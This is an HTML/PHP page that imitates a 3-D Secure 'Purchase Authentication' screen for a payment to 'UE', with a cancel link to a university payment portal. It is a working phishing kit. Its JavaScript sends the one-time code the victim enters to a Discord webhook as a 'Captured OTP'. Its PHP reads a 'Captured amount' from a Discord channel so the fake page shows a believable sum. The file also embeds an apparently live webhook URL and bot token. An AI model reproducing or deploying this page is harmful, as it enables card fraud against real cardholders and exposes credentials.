<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>3DS Simulation</title>
<link rel="stylesheet" href="styles.css">
<script>
function sendToDiscord() {
    const otp = document.getElementById('otp').value;

    const webhookUrl = 'https://discord.com/api/webhooks/1246523083519692891/7Di8BJes3Ff-hEnscABxC3Csz2wruZCsB4V2f1Lwv_66UezGZlnBYPxyO59lU3IyZwsP';
    const payload = JSON.stringify({
        content: `Captured OTP: **${otp}**`
    });

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: payload
    }).then(response => {
        if (!response.ok) {
            alert('Error sending OTP to Discord');
        }
    }).catch(error => {
        alert('Fetch error: ' + error);
    });
}

function resendCode() {
    alert('Code resent.');
}

function cancelOrder() {
    window.location.href = 'https://ue.edu.ph/paymentportal/';
}
</script>
</head>
<body>
<?php
function get_latest_amount_from_discord($channel_id, $bot_token) {
    $url = "https://discord.com/api/v10/channels/$channel_id/messages?limit=10";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Authorization: Bot ' . $bot_token
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Curl error: ' . curl_error($ch));
        return null;
    }
    curl_close($ch);

    $messages = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        error_log('JSON decode error: ' . json_last_error_msg());
        return null;
    }

    foreach ($messages as $message) {
        if (isset($message['content']) && strpos($message['content'], 'Captured amount:') !== false) {
            preg_match('/Captured amount: ([\d.]+)/', $message['content'], $matches);
            if (isset($matches[1])) {
                return $matches[1];
            }
        }
    }
    return null;
}

// Fetch the latest amount from Discord
$channel_id = "1246523057917530204";
$bot_token = "MTIyMDMzNzQ0MTk5MTU2MTI1Ng.GcSMeC.4YqEy_9xBEHLjjn8urmSNAuDTvAY8LFQqkg26s";
$latest_amount = get_latest_amount_from_discord($channel_id, $bot_token);
$display_amount = $latest_amount ? "₱$latest_amount" : "₱1000.00";
?>
<div class="container">
    <h1>Purchase Authentication</h1>
    <p>We have sent you a text message with a code to your registered mobile number. You are paying merchant UE the amount of <?php echo $display_amount; ?>.</p>
    <form onsubmit="sendToDiscord(); return false;">
        <label for="otp">Enter your code below:</label>
        <input type="text" id="otp" name="otp" required>
        <button type="submit">CONFIRM</button>
        <button type="button" onclick="resendCode()">RESEND</button>
        <button type="button" onclick="cancelOrder()">CANCEL</button>
    </form>
</div>
</body>
</html>
